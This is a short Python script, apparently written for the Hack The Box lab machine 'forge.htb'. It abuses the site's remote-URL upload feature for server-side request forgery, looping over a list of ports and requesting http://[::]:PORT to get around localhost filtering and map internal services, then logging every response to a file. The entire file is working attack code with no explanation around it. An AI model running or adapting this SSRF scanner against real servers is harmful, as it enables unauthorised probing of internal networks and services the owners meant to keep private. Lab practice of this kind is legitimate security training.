import requests

u = 'http://forge.htb/upload'
header = {'Content-Type':'application/x-www-form-urlencoded'}

ports = open('/sdcard/ports.txt').read().strip().split('\n')

for port in ports:
    b = f'url=http://[::]:{port}/test.py&remote=1'
    res = requests.post(u,headers=header,data=b)
    print(res.text)
    with open('test.txt','a+') as f:
        f.write(f'{res.text}\n')
